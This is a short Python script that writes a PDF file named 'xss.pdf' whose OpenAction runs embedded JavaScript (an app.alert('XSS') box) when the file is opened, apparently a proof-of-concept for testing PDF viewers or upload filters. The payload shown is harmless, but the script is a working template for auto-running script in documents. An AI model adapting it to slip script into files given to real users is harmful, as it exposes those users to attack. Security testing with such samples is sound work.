def create_malpdf1(filename):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7
        1 0 obj
        <</Pages 1 0 R /OpenAction 2 0 R>>
        2 0 obj
        <</S /JavaScript /JS (app.alert('XSS'))
        >> trailer <</Root 1 0 R>>''')

if __name__ == "__main__":
    print("Creating PDF files..")
    create_malpdf1("xss.pdf")
    print("Done!")